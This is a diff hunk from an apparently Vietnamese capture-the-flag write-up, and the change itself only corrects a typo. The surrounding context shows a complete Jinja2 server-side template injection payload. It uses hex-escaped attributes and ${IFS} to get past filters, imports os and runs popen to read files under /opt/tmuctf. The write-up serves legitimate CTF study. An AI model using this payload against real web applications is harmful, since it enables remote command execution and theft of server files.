@@ -56,7 +56,7 @@ Sau một vài lần thử thì mình có thể biết được: các kí tự: 
  
  * Thay khoảng trằng băng ${IFS}
  
- Finally, chúng ta đã có thể excute được command.
+ Finally, chúng ta đã có thể execute được command.
  
  ```
  {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('\x6f\x73')|attr('po''pen')('cat${IFS}/opt/tmuctf/*')|attr('read')()}}
